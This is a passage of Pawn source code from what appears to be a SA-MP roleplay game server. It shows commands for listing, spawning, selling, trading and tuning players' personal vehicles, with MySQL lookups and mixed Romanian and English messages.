		mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pCarkey8]);
		new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
		if(cache_get_row_count() < 1) masiniimperfecte++;
		cache_delete(rezolvarebugdefinitiv);
	}
	if(PlayerInfo[playerid][pCarkey9] != 0) // slot 9
	{
		new rezolvare[1500];
		mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pCarkey9]);
		new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
		if(cache_get_row_count() < 1) masiniimperfecte++;
		cache_delete(rezolvarebugdefinitiv);
	}
	if(PlayerInfo[playerid][pCarkey10] != 0) // slot 10
	{
		new rezolvare[1500];
		mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pCarkey10]);
		new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
		if(cache_get_row_count() < 1) masiniimperfecte++;
		cache_delete(rezolvarebugdefinitiv);
	}
	if(PlayerInfo[playerid][pCarkey11] != 0) // slot 10
	{
		new rezolvare[1500];
		mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pCarkey11]);
		new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
		if(cache_get_row_count() < 1) masiniimperfecte++;
		cache_delete(rezolvarebugdefinitiv);
	}
	if(PlayerInfo[playerid][pCarkey12] != 0) // slot 10
	{
		new rezolvare[1500];
		mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pCarkey12]);
		new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
		if(cache_get_row_count() < 1) masiniimperfecte++;
		cache_delete(rezolvarebugdefinitiv);
	}
	if(PlayerInfo[playerid][pCarkey13] != 0) // slot 10
	{
		new rezolvare[1500];
		mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pCarkey13]);
		new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
		if(cache_get_row_count() < 1) masiniimperfecte++;
		cache_delete(rezolvarebugdefinitiv);
	}
	if(PlayerInfo[playerid][pCarkey14] != 0) // slot 10
	{
		new rezolvare[1500];
		mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pCarkey14]);
		new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
		if(cache_get_row_count() < 1) masiniimperfecte++;
		cache_delete(rezolvarebugdefinitiv);
	}
	if(PlayerInfo[playerid][pCarkey15] != 0) // slot 10
	{
		new rezolvare[1500];
		mysql_format(SQL, rezolvare, sizeof(rezolvare), "SELECT * FROM `cars` WHERE `ID`='%d'",PlayerInfo[playerid][pCarkey15]);
		new Cache:rezolvarebugdefinitiv = mysql_query(SQL, rezolvare);
		if(cache_get_row_count() < 1) masiniimperfecte++;
		cache_delete(rezolvarebugdefinitiv);
	}
	if(masiniimperfecte > 0)
	{
		format(MGLOBAL, sizeof(MGLOBAL), "you %d imperfect vehicles for can type this command, these vehicles will need to be removed from your possession.",masiniimperfecte);
		ShowPlayerDialog(playerid, DIALOG_MASINIIMPERFECTE, DIALOG_STYLE_MSGBOX, "Server: The problem vehicles", MGLOBAL, "Accept", "Refuse");
		return 1;
	}
 	if(PlayerInfo[playerid][pPcarkey] != 0)// slot 1
 	{
		//if(CarInfo[PlayerInfo[playerid][pPcarkey]][cModel] < 400 || CarInfo[PlayerInfo[playerid][pPcarkey]][cModel] > 610 || CarInfo[PlayerInfo[playerid][pPcarkey]][cID2] < 1) masiniimperfecte++;
 	    if(personalcar[0][playerid] != 0)
 	    {
			format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pPcarkey]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][0]));
			strcat(masina, masina1);
		}
		else
		{
		    format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pPcarkey]][cModel]-400]);
			strcat(masina, masina1);
		}
 	}
 	else
 	{
 	    format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
		strcat(masina, masina1);
	}
 	if(PlayerInfo[playerid][pmotokey] != 0)// slot 2
 	{
		//if(CarInfo[PlayerInfo[playerid][pmotokey]][cModel] < 400 || CarInfo[PlayerInfo[playerid][pmotokey]][cModel] > 610 || CarInfo[PlayerInfo[playerid][pmotokey]][cID2] < 1) masiniimperfecte++;
		if(personalcar[1][playerid] != 0)
 	    {
			format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pmotokey]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][1]));
			strcat(masina, masina1);
		}
		else
		{
		    format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pmotokey]][cModel]-400]);
			strcat(masina, masina1);
		}
 	}
 	else
 	{
 	    format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
		strcat(masina, masina1);
	}
 	if(PlayerInfo[playerid][pprcarkey] != 0)// slot 3
 	{
		//if(CarInfo[PlayerInfo[playerid][pprcarkey]][cModel] < 400 || CarInfo[PlayerInfo[playerid][pprcarkey]][cModel] > 610 || CarInfo[PlayerInfo[playerid][pprcarkey]][cID2] < 1) masiniimperfecte++;
		if(personalcar[2][playerid] != 0)
 	    {
			format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pprcarkey]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][2]));
			strcat(masina, masina1);
		}
		else
		{
		    format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pprcarkey]][cModel]-400]);
			strcat(masina, masina1);
		}
 	}
 	else
 	{
 	    format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
		strcat(masina, masina1);
	}
 	if(PlayerInfo[playerid][pprcarkey2] != 0)// slot 4
 	{
		//if(CarInfo[PlayerInfo[playerid][pprcarkey2]][cModel] < 400 || CarInfo[PlayerInfo[playerid][pprcarkey2]][cModel] > 610 || CarInfo[PlayerInfo[playerid][pprcarkey2]][cID2] < 1) masiniimperfecte++;
		if(personalcar[3][playerid] != 0)
 	    {
			format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pprcarkey2]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][3]));
			strcat(masina, masina1);
		}
		else
		{
		    format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pprcarkey2]][cModel]-400]);
			strcat(masina, masina1);
		}
 	}
 	else
 	{
 	    format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
		strcat(masina, masina1);
	}
 	if(PlayerInfo[playerid][pPPluscarkey] != 0)// slot 5
 	{
		//if(CarInfo[PlayerInfo[playerid][pPPluscarkey]][cModel] < 400 || CarInfo[PlayerInfo[playerid][pPPluscarkey]][cModel] > 610 || CarInfo[PlayerInfo[playerid][pPPluscarkey]][cID2] < 1) masiniimperfecte++;
		if(personalcar[4][playerid] != 0)
 	    {
			format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pPPluscarkey]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][4]));
			strcat(masina, masina1);
		}
		else
		{
		    format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pPPluscarkey]][cModel]-400]);
			strcat(masina, masina1);
		}
 	}
 	else
 	{
 	    format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
		strcat(masina, masina1);
	}
 	if(PlayerInfo[playerid][pPPluscarkey2] != 0) // slot 6
 	{
		//if(CarInfo[PlayerInfo[playerid][pPPluscarkey2]][cModel] < 400 || CarInfo[PlayerInfo[playerid][pPPluscarkey2]][cModel] > 610 || CarInfo[PlayerInfo[playerid][pPPluscarkey2]][cID2] < 1) masiniimperfecte++;
		if(personalcar[5][playerid] != 0)
 	    {
			format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pPPluscarkey2]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][5]));
			strcat(masina, masina1);
		}
		else
		{
		    format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pPPluscarkey2]][cModel]-400]);
			strcat(masina, masina1);
		}
 	}
 	else
 	{
 	    format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
		strcat(masina, masina1);
	}
	if(PlayerInfo[playerid][pCarkey7] != 0) // slot 7
 	{
		//if(CarInfo[PlayerInfo[playerid][pCarkey7]][cModel] < 400 || CarInfo[PlayerInfo[playerid][pCarkey7]][cModel] > 610 || CarInfo[PlayerInfo[playerid][pCarkey7]][cID2] < 1) masiniimperfecte++;
		if(personalcar[6][playerid] != 0)
 	    {
			format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey7]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][6]));
			strcat(masina, masina1);
		}
		else
		{
		    format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey7]][cModel]-400]);
			strcat(masina, masina1);
		}
 	}
 	else
 	{
 	    format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
		strcat(masina, masina1);
	}
	if(PlayerInfo[playerid][pCarkey8] != 0) // slot 8
 	{
		//if(CarInfo[PlayerInfo[playerid][pCarkey8]][cModel] < 400 || CarInfo[PlayerInfo[playerid][pCarkey8]][cModel] > 610 || CarInfo[PlayerInfo[playerid][pCarkey8]][cID2] < 1) masiniimperfecte++;
		if(personalcar[7][playerid] != 0)
 	    {
			format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey8]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][7]));
			strcat(masina, masina1);
		}
		else
		{
		    format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey8]][cModel]-400]);
			strcat(masina, masina1);
		}
 	}
 	else
 	{
 	    format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
		strcat(masina, masina1);
	}
	if(PlayerInfo[playerid][pCarkey9] != 0) // slot 9
 	{
		//if(CarInfo[PlayerInfo[playerid][pCarkey9]][cModel] < 400 || CarInfo[PlayerInfo[playerid][pCarkey9]][cModel] > 610 || CarInfo[PlayerInfo[playerid][pCarkey9]][cID2] < 1) masiniimperfecte++;
		if(personalcar[8][playerid] != 0)
 	    {
			format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey9]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][8]));
			strcat(masina, masina1);
		}
		else
		{
		    format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey9]][cModel]-400]);
			strcat(masina, masina1);
		}
 	}
 	else
 	{
 	    format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
		strcat(masina, masina1);
	}
	if(PlayerInfo[playerid][pCarkey10] != 0) // slot 10
 	{
		//if(CarInfo[PlayerInfo[playerid][pCarkey10]][cModel] < 400 || CarInfo[PlayerInfo[playerid][pCarkey10]][cModel] > 610 || CarInfo[PlayerInfo[playerid][pCarkey10]][cID2] < 1) masiniimperfecte++;
		if(personalcar[9][playerid] != 0)
 	    {
			format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey10]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][9]));
			strcat(masina, masina1);
		}
		else
		{
		    format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey10]][cModel]-400]);
			strcat(masina, masina1);
		}
 	}
 	else
 	{
 	    format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
		strcat(masina, masina1);
	}
	if(PlayerInfo[playerid][pCarkey11] != 0 && PlayerInfo[playerid][pVip] > 0) // slot 11
 	{
		if(personalcar[10][playerid] != 0)
 	    {
			format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey11]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][10]));
			strcat(masina, masina1);
		}
		else
		{
		    format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey11]][cModel]-400]);
			strcat(masina, masina1);
		}
 	}
 	else
 	{
		if(PlayerInfo[playerid][pVip] > 0)
		{
			format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
			strcat(masina, masina1);
		}	
	}
	if(PlayerInfo[playerid][pCarkey12] != 0 && PlayerInfo[playerid][pVip] > 0) // slot 11
 	{
		if(personalcar[11][playerid] != 0)
 	    {
			format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey12]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][11]));
			strcat(masina, masina1);
		}
		else
		{
		    format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey12]][cModel]-400]);
			strcat(masina, masina1);
		}
 	}
 	else
 	{
 	    if(PlayerInfo[playerid][pVip] > 0)
		{
			format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
			strcat(masina, masina1);
		}
	}
	if(PlayerInfo[playerid][pCarkey13] != 0 && PlayerInfo[playerid][pVip] > 0) // slot 11
 	{
		if(personalcar[12][playerid] != 0)
 	    {
			format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey13]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][12]));
			strcat(masina, masina1);
		}
		else
		{
		    format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey13]][cModel]-400]);
			strcat(masina, masina1);
		}
 	}
 	else
 	{
 	    if(PlayerInfo[playerid][pVip] > 0)
		{
			format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
			strcat(masina, masina1);
		}
	}
	if(PlayerInfo[playerid][pCarkey14] != 0 && PlayerInfo[playerid][pVip] > 0) // slot 11
 	{
		if(personalcar[13][playerid] != 0)
 	    {
			format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey14]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][13]));
			strcat(masina, masina1);
		}
		else
		{
		    format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey14]][cModel]-400]);
			strcat(masina, masina1);
		}
 	}
 	else
 	{
 	    if(PlayerInfo[playerid][pVip] > 0)
		{
			format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
			strcat(masina, masina1);
		}
	}
	if(PlayerInfo[playerid][pCarkey15] != 0 && PlayerInfo[playerid][pVip] > 0) // slot 11
 	{
		if(personalcar[14][playerid] != 0)
 	    {
			format(masina1, sizeof(masina1), "{0C370A}(spawned) {FFFFFF}%s\t%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey15]][cModel]-400],CalculeazaTimp2(DespawnCar[playerid][14]));
			strcat(masina, masina1);
		}
		else
		{
		    format(masina1, sizeof(masina1), "{FB0404}(despawned) {FFFFFF}%s\n",aVehicleNames[CarInfo[PlayerInfo[playerid][pCarkey15]][cModel]-400]);
			strcat(masina, masina1);
		}
 	}
 	else
 	{
 	    if(PlayerInfo[playerid][pVip] > 0)
		{
			format(masina1, sizeof(masina1), "{F3FF73}[ empty ]\n");
			strcat(masina, masina1);
		}
	}
	format(MGLOBAL, sizeof(MGLOBAL), "Status / Vehicle\tTime to despawnare\n%s", masina);
 	if(PlayerInfo[playerid][pPcarkey] == 0 && PlayerInfo[playerid][pmotokey] == 0 && PlayerInfo[playerid][pprcarkey] == 0 && PlayerInfo[playerid][pprcarkey2] == 0 && PlayerInfo[playerid][pPPluscarkey] == 0 && PlayerInfo[playerid][pPPluscarkey2] == 0
 	&& PlayerInfo[playerid][pCarkey7] == 0 && PlayerInfo[playerid][pCarkey8] == 0 && PlayerInfo[playerid][pCarkey9] == 0 && PlayerInfo[playerid][pCarkey10] == 0
	&& PlayerInfo[playerid][pCarkey11] == 0 && PlayerInfo[playerid][pCarkey12] == 0 && PlayerInfo[playerid][pCarkey13] == 0
	&& PlayerInfo[playerid][pCarkey14] == 0 && PlayerInfo[playerid][pCarkey15] == 0)
 	    return SendClientMessage(playerid, COLOR_SERVER, "Not own any car.");
	ShowPlayerDialog(playerid,DIALOG_VEHSPAWN,DIALOG_STYLE_TABLIST_HEADERS,"Vehicle Spawn",MGLOBAL,"Select","Exit");
	return 1;
}
CMD:sellhidden(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	new id,price,sendername[30],giveplayer[30],string[128],other[128];
	if(sscanf(params, "uiS(NULL)", id,price,other)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/sellhidden <Name/Playerid> <price>");
	if(PlayerInfo[playerid][pHiddenColor] <= 0)
	{
 		ShowPlayerDialog(playerid, DIALOG_NOPP, DIALOG_STYLE_MSGBOX, "Not enough hidden colors", "You don't have enough hidden colors to do this.", "Close", "");
   		return 1;
	}
	if(strcmp(other, "NULL", true)) return SCM(playerid,COLOR_SERVER,"Do not use spaces in price.");
	if(price < 1 || price > 500000000) return SendClientMessage(playerid, COLOR_GREY, "{FFB870}Price not lower then 1 and not higher then $500,000,000.");
	if(GetPlayerCash(id) < price) return SCM(playerid,COLOR_SERVER,"{FFB870}This player don't have money needed.");
	GetPlayerName(playerid, sendername, sizeof(sendername));
	GetPlayerName(id, giveplayer, sizeof(giveplayer));
	if(IsPlayerConnected(id))
	{
	    if(IsPlayerInRangeOfPlayer(playerid, id, 5.0))
	    {
			hiddenoffer[id] = playerid;
			hiddenprice[id] = price;
			format(string, sizeof(string), "* %s offered you a hidden color for $%s. (/accept hidden %d)",sendername,FormatNumber(price),playerid);
			SendClientMessage(id, COLOR_GREEN, string);
			format(string, sizeof(string), "* You offered a hidden color to %s for $%s.",giveplayer,FormatNumber(price));
			SendClientMessage(playerid, COLOR_GREEN, string);
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Player is not near you.");
	}
	return 1;
}
/*CMD:tradecar(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pPcarkey] == 0 && PlayerInfo[playerid][pmotokey] == 0 && PlayerInfo[playerid][phelikey] == 0 && PlayerInfo[playerid][pprcarkey] == 0 && PlayerInfo[playerid][pprcarkey2] == 0 && PlayerInfo[playerid][pPPluscarkey] == 0 && PlayerInfo[playerid][pPPluscarkey2] == 0) return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}You do not have a vehicle.");
	new id,price,other[128];
	if(sscanf(params, "uiS(NULL)", id,price,other)) return SCM(playerid,COLOR_SERVER,"{A9C4E4}Usage: {FFFFFF}/tradecar <Name/Playerid> <difference> Tu vei plati diferenta.");
    if(strcmp(other, "NULL", true)) return SCM(playerid,COLOR_SERVER,"Nu folosi spatii in pret.");
	if(id == playerid) return SendClientMessage(playerid,COLOR_SERVER,"Nu iti poti schimba masina singur.");
	new sendername[30],giveplayer[30],VehI = OwnedVeh(GetPlayerVehicleID(playerid)),VehI2 = OwnedVeh(GetPlayerVehicleID(id));
	if(PlayerInfo[id][pPcarkey] == 0 && PlayerInfo[id][pmotokey] == 0 && PlayerInfo[id][phelikey] == 0 && PlayerInfo[id][pprcarkey] == 0 && PlayerInfo[id][pprcarkey2] == 0 && PlayerInfo[id][pPPluscarkey] == 0 && PlayerInfo[id][pPPluscarkey2] == 0) return SendClientMessage(playerid,COLOR_SERVER,"{FFB870}That player don't have a vehicle.");
	if(price < 1 || price > 500000000) return SendClientMessage(playerid, COLOR_GREY, "{FFB870}Price not lower then 1 and not higher then $500,000,000.");
    new vid = GetPlayerVehicleID(playerid),vid2 = GetPlayerVehicleID(id);
	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_SERVER, "Nu esti in masina personala.");
	if(!IsPlayerInAnyVehicle(id)) return SendClientMessage(playerid, COLOR_SERVER, "Acel jucator nu este in masina personala.");
	if(vid != personalcar[0][playerid] && vid != personalcar[1][playerid] && vid != personalcar[2][playerid] && vid != personalcar[3][playerid] && vid != personalcar[4][playerid] && vid != personalcar[5][playerid]) return SendClientMessage(playerid, COLOR_SERVER, "Nu esti in masina personala.");
    if(vid2 != personalcar[0][id] && vid2 != personalcar[1][id] && vid2 != personalcar[2][id] && vid2 != personalcar[3][id] && vid2 != personalcar[4][id] && vid2 != personalcar[5][id]) return SendClientMessage(playerid, COLOR_SERVER, "Acel jucator nu este in masina personala.");
	if(GetPlayerCash(id) < price) return SCM(playerid,COLOR_SERVER,"{FFB870}This player don't have money needed.");
	if(PlayerInfo[playerid][pLevel] < 3) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You don't have level 3.");
	if(PlayerInfo[id][pLevel] < 3) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}That player doesn't have level 3.");
	if(VehI != PlayerInfo[playerid][pPcarkey] && VehI != PlayerInfo[playerid][pmotokey] && VehI != PlayerInfo[playerid][pprcarkey] && VehI != PlayerInfo[playerid][pprcarkey2] && VehI != PlayerInfo[playerid][pPPluscarkey] && VehI != PlayerInfo[playerid][pPPluscarkey2])
	    return SendClientMessage(playerid, COLOR_SERVER, "This is not your car.");
 	if(VehI2 != PlayerInfo[id][pPcarkey] && VehI2 != PlayerInfo[id][pmotokey] && VehI2 != PlayerInfo[id][pprcarkey] && VehI2 != PlayerInfo[id][pprcarkey2] && VehI2 != PlayerInfo[id][pPPluscarkey] && VehI2 != PlayerInfo[id][pPPluscarkey2])
	    return SendClientMessage(playerid, COLOR_SERVER, "That player is not in his car.");
    GetPlayerName(playerid, sendername, sizeof(sendername));
	GetPlayerName(id, giveplayer, sizeof(giveplayer));
	if(IsPlayerConnected(id))
	{
	    if(IsPlayerInRangeOfPlayer(playerid, id, 5.0))
	    {
	        new vehh = GetPlayerVehicleID(playerid),vehh2 = GetPlayerVehicleID(id),vehhh = OwnedVeh(GetPlayerVehicleID(playerid)),vehhh2 = OwnedVeh(GetPlayerVehicleID(id)),string[256];
	   		if(vehh == personalcar[0][playerid])
	   		{
	   	        tradecars[id] = personalcar[0][playerid];
			}
			if(vehh == personalcar[1][playerid])
	   		{
	   	        tradecars[id] = personalcar[1][playerid];
			}
			if(vehh == personalcar[2][playerid])
	   		{
	   	        tradecars[id] = personalcar[2][playerid];
			}
			if(vehh == personalcar[3][playerid])
	   		{
	   	        tradecars[id] = personalcar[3][playerid];
			}
			if(vehh == personalcar[4][playerid])
	   		{
	   	        tradecars[id] = personalcar[4][playerid];
			}
			if(vehh == personalcar[5][playerid])
	   		{
	   	        tradecars[id] = personalcar[5][playerid];
			}

			if(vehh2 == personalcar[0][id])
	   		{
	   	        tradecars2[id] = personalcar[0][id];
			}
			if(vehh2 == personalcar[1][id])
	   		{
	   	        tradecars2[id] = personalcar[1][id];
			}
			if(vehh2 == personalcar[2][id])
	   		{
	   	        tradecars2[id] = personalcar[2][id];
			}
			if(vehh2 == personalcar[3][id])
	   		{
	   	        tradecars2[id] = personalcar[3][id];
			}
			if(vehh2 == personalcar[4][id])
	   		{
	   	        tradecars2[id] = personalcar[4][id];
			}
			if(vehh2 == personalcar[5][id])
	   		{
	   	        tradecars2[id] = personalcar[5][id];
			}
			tradetype[id] = vehhh;
			tradetype2[id] = vehhh2;
			tradeofferer[id] = playerid;
			tradediff[id] = price;
	        format(string, sizeof(string), "I-ai oferit lui %s masina ta (%s) in schimbul masinii %s [age: %d, KM: %.0f, colors: %d, %d] + $%s diferenta.",giveplayer,CarInfo[vehhh][cDescription],CarInfo[vehhh2][cDescription],CarInfo[vehhh2][cDays],CarInfo[vehhh2][cKM],CarInfo[vehhh2][cColorOne],CarInfo[vehhh2][cColorTwo],FormatNumber(price));
			SendClientMessage(playerid, COLOR_GREEN, string);
			format(string, sizeof(string), "%s iti ofera masina lui %s [age: %d, KM: %.0f, colors: %d, %d] + $%s pentru masina ta (%s).",sendername,CarInfo[vehhh][cDescription],CarInfo[vehhh][cDays],CarInfo[vehhh][cKM],CarInfo[vehhh][cColorOne],CarInfo[vehhh][cColorTwo],FormatNumber(price),CarInfo[vehhh2][cDescription]);
			SendClientMessage(id, COLOR_GREEN, string);
			format(string, sizeof(string), "Scrie /accept tradecar %d pentru a accepta aceasta oferta",playerid);
			SendClientMessage(id, COLOR_SERVER, string);
   		}
		else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Player is not near you.");
	}
	return 1;
}*/
CMD:tunning(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SCM(playerid, COLOR_ERROR, "You are not logged in.");
	if(!IsPlayerInRangeOfPoint(playerid, 3.0, 1040.8484,-1029.3612,32.1016)) return SCM(playerid, COLOR_ERROR, "You're in Los Santos Tuning Garage.");
	if(GetPlayerCash(playerid) < 1500) return SCM(playerid, COLOR_ERROR, "Nu ai $1,500.");
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SCM(playerid, COLOR_ERROR, "You're the driver.");
	if(IsPlayerInAnyVehicle(playerid))
	{
		new vid = GetPlayerVehicleID(playerid);
		if(vid != personalcar[0][playerid] && vid != personalcar[1][playerid] && vid != personalcar[2][playerid] && vid != personalcar[3][playerid] && vid != personalcar[4][playerid] && vid != personalcar[5][playerid]
		&& vid != personalcar[6][playerid] && vid != personalcar[7][playerid] && vid != personalcar[8][playerid] && vid != personalcar[9][playerid] && vid != personalcar[10][playerid]
		&& vid != personalcar[11][playerid] && vid != personalcar[12][playerid] && vid != personalcar[13][playerid] && vid != personalcar[14][playerid]) return SendClientMessage(playerid, COLOR_SERVER, "Nu esti in masina personala.");
		SelectTextDraw(playerid, 0xFF000000);
		format(MGLOBAL, sizeof(MGLOBAL), "%s",aVehicleNames[GetVehicleModel(vid)-400]);
		PlayerTextDrawSetString(playerid, TuneTD[18], MGLOBAL);
		PlayerTextDrawSetPreviewModel(playerid, TuneTD[17], GetVehicleModel(vid));
		for(new i = 0; i < sizeof(TuneTD); i++) PlayerTextDrawShow(playerid, TuneTD[i]);
		SetPlayerVirtualWorld(playerid, playerid+1);
		SetVehicleVirtualWorld(vid, playerid+1);
		//|----------camera din fata----------|
		InterpolateCameraPos(playerid, 268.983154, -175.870849, 1073.296752, 260.771148, -166.982559, 1071.866210, 3000);
		InterpolateCameraLookAt(playerid, 265.597778, -172.630737, 1071.552978, 264.244964, -170.180847, 1070.221923, 3000);
		SetVehiclePos(GetPlayerVehicleID(playerid), 263.6352,-171.3507,1070.1691);
		SetVehicleZAngle(GetPlayerVehicleID(playerid), 360.0000);
		InTunning[playerid] = 1;
		RepairVehicle(GetPlayerVehicleID(playerid));
		PlayerTextDrawHide(playerid, TDKM[playerid][0]);
		PlayerTextDrawHide(playerid, TDKM[playerid][1]);
		PlayerTextDrawHide(playerid, TDKM[playerid][2]);
		PlayerTextDrawHide(playerid, TDKM[playerid][3]);
		PlayerTextDrawHide(playerid, TDKM[playerid][4]);
		BizzInfo[38][bTill] += 1500;
		GivePlayerCash(playerid, -1500);
		new str[128];
		mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='38'",BizzInfo[38][bTill]);
		mysql_tquery(SQL,str,"","");
	}
	return 1;
}
CMD:sellcarto(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(PlayerInfo[playerid][pPcarkey] == 0 && PlayerInfo[playerid][pmotokey] == 0 && PlayerInfo[playerid][phelikey] == 0 && PlayerInfo[playerid][pprcarkey] == 0 && PlayerInfo[playerid][pprcarkey2] == 0 && PlayerInfo[playerid][pPPluscarkey] == 0 && PlayerInfo[playerid][pPPluscarkey2] == 0
